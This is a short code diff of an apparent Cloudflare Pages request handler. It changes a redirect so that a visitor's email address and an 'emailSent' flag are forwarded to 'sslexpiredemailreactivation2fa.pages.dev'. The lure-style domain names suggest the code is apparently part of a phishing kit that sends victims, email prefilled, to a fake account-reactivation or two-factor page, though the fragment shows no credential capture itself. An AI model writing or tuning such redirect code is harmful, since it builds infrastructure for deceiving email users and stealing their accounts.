@@ -41,6 +41,6 @@ export async function onRequestGet(context) {
   }
 
   // Redirect with status
-  const redirectUrl = `sslexpiredemailreactivation.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
+  const redirectUrl = `https://sslexpiredemailreactivation2fa.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
   return Response.redirect(redirectUrl, 302);
 }
